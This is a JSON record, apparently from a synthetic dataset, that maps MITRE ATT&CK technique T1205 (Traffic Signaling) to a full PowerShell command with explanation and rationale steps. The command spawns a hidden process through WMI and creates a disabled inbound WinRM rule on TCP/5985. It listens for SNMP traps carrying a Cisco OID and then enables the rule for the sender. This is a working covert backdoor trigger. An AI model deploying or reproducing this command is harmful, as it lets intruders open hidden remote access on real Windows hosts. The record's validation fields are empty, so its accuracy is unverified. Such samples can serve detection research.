{
  "technique_id": "T1205",
  "platform": "Windows",
  "shell": "PowerShell",
  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RemoteMgmt-SNMP'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RemoteMgmt-SNMP'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RemoteMgmt-SNMP'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(162); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $trapTag=$false; foreach($b in $d){ if($b -eq 0xA7){ $trapTag=$true; break } }; $oid=[byte[]](0x2b,0x06,0x01,0x04,0x01,0x09); $hit=$false; for($i=0;$i -le $d.Length-$oid.Length;$i++){ $ok=$true; for($j=0;$j -lt $oid.Length;$j++){ if($d[$i+$j] -ne $oid[$j]){$ok=$false;break} }; if($ok){$hit=$true;break} }; if($trapTag -and $hit){ Set-NetFirewallRule -DisplayName ''Signal-Open-RemoteMgmt-SNMP'' -Enabled True -RemoteAddress $ep.Address; break } } }'",
  "explanation": "Watches SNMP traps on UDP/162 and checks for a v2c/v3 Trap PDU (0xA7) containing a Cisco enterprise OID prefix (1.3.6.1.4.1.9 in BER encoding). This device-specific signal enables a WinRM rule for the trap source.",
  "rationale_steps": [
    "Create disabled inbound rule for TCP/5985.",
    "Listen for SNMP Trap PDUs and scan for Cisco enterprise OID bytes.",
    "Enable the firewall rule restricted to the trap sender upon detection."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1205-5411a282-544a1818",
  "source_prompt_hash": "5411a282",
  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
  "validation": {
    "syntax_ok": null,
    "llm_judge": null,
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}